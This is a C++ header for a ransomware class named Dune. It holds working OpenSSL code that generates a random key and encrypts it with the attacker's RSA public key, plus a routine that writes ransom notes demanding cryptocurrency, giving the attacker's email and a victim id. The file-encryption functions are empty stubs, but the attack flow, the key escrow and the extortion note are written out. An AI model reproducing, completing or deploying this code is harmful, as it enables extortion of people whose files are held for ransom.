#ifndef __DUNE__
#define __DUNE__
#include <string>
#include <thread>
#include <fstream>
#include <vector>
#include <filesystem>
#include <stdlib.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/err.h>
#include "crypto.hpp"
#include "common.hpp"

namespace dune
{
    enum ATTACK_STATUS
    {
        RUNNING,
        OPENSSL_ERROR,
        YOU_DID_NOW_ACCEPT,
        UNABLE_TO_WRITE_ALL_NOTES
    };
    /* All must be set to true or the program will terminate */
    struct Acknowledgement
    {
        bool are_you_sure_you_want_to_do_this;
        bool i_understand_it_is_illegel;
        bool i_accept_the_risks_and_consequences_of_my_actions;
    };
    class Dune
    {
    public:
        Dune(double _ransom_amount, std::string _crypto_currency_type, std::string _address, std::string _user_message, std::vector<std::string> _user_note_locations, std::string email_of_hacker, std::string rsa_public_key_pem_format_of_hacker_for_decryption)
        {
            public_key_pem = rsa_public_key_pem_format_of_hacker_for_decryption;
            ransom_amount = _ransom_amount;
            crypto_currency_type = _crypto_currency_type;
            address = _address;
            user_message = _user_message;
            user_notes_locations = _user_note_locations;
            hacker_email = email_of_hacker;
        };
        /* Must pass the Acknowledgement stucture */
        ATTACK_STATUS attack(Acknowledgement agreement, bool force)
        {
            if (!(agreement.are_you_sure_you_want_to_do_this && agreement.i_accept_the_risks_and_consequences_of_my_actions && agreement.i_understand_it_is_illegel))
            {
                std::cout << "Oh, Well this is embarrassing..." << std::endl;
                return ATTACK_STATUS::YOU_DID_NOW_ACCEPT;
            }
            std::string user_home_path = std::string(getenv("HOMEDRIVE")) + std::string(getenv("HOMEPATH"));
            std::vector<std::string> files_in_dir;
            derive_key();
            encrypt_derived_key();
            if (write_note() != user_notes_locations.size())
            {
                return ATTACK_STATUS::UNABLE_TO_WRITE_ALL_NOTES;
            }
            std::thread encryptor(encrypt_files, plain_key, exempt_files);
            encryptor.detach();
            return ATTACK_STATUS::RUNNING;
        }
        bool verify_job()
        {
            return false;
        }

    private:
        double ransom_amount;
        std::string hacker_email;
        std::string crypto_currency_type;
        std::string address;
        std::string user_message;
        std::vector<std::string> exempt_files;
        std::vector<std::string> user_notes_locations;
        std::string public_key_pem;
        std::string encrypted_key;
        std::string plain_key;
        void encrypt_file(std::string full_path)
        {
        }
        void derive_key()
        {
            unsigned char buffer[32];
            int rc = RAND_bytes(buffer, 32);
            plain_key = std::string((const char *)buffer, sizeof(buffer));
        }
        std::string encryptWithPublicKey(const char *pData, int iLen)
        { // pData: String to encrypt, iLen: length

            char *chPublicKey = public_key_pem.data();
            BIO *bio = BIO_new_mem_buf(chPublicKey, -1);
            RSA *rsa = PEM_read_bio_RSA_PUBKEY(bio, NULL, NULL, NULL);
            int nLen = RSA_size(rsa);
            char *pEncode = (char *)malloc(nLen + 1);
            int rc = RSA_public_encrypt(iLen, (unsigned char *)pData, (unsigned char *)pEncode, rsa, RSA_PKCS1_PADDING);
            if (rc < 0)
            {
                char buf[128];
                std::cerr << "RSA_public_encrypt: " << ERR_error_string(ERR_get_error(), buf) << std::endl;
            }
            RSA_free(rsa);
            CRYPTO_cleanup_all_ex_data();
            std::string strName = std::string(pEncode, nLen);
            return strName;
        }
        void encrypt_derived_key()
        {
            encrypted_key = encryptWithPublicKey(plain_key.data(), plain_key.length());
        }
        static void ls_recursive(const std::filesystem::path &path, std::vector<std::string> *files)
        {
            for (const auto &p : std::filesystem::recursive_directory_iterator(path))
            {
                if (!std::filesystem::is_directory(p))
                {
                    files->push_back(p.path());
                }
            }
        }
        static void encrypt_files(std::string enc_key, std::vector<std::string> excluded_hashes)
        {
        }
        int write_note()
        {
            /*
             */
            std::string note = "Message from hacker: " + user_message + "\n\n";
            note += "You must pay in this type of cryptocurrency " + crypto_currency_type + ".\n";
            note += "The ransom amount is " + std::to_string(ransom_amount) + " " + crypto_currency_type + ".\n";
            note += "The address to pay is: \n\n" + address + "\n\n";
            note += "This address is specific to this attack. If you have multiple attacks paying another address will not help you get your files back. ";
            note += "The full amount or more must be paid to the " + crypto_currency_type + " address specified.\n";
            note += "DO NOT MODIFY THIS OR ALL YOUR FILES WILL BE LOST (It is the RSA encrypted key for decryption)\n\n" + base64_encode((unsigned char *)(encrypted_key.data()), encrypted_key.length()) + "\n\n";
            note += "Send this whole file to this email address AFTER you have paid the ransom: " + hacker_email + "\n\nIf you contact this email below the ransom is paid in full it will likely be increased.\n\n\n";
            note += "This is your victim id: " + generate_uuid() + ".\n";
            std::string exempt_hash;
            dune::crypto::Compute_SHA_256(note, &exempt_hash);
            exempt_files.push_back(exempt_hash);
            int success = 0;
            for (int i = 0; i < user_notes_locations.size(); i++)
            {
                try
                {
                    std::ofstream file_to_write(user_notes_locations[i]);
                    file_to_write.write(note.c_str(), note.length());
                    file_to_write.close();
                    success++;
                }
                catch (...)
                {
                }
            }
            return success;
        }
    };
};

#endif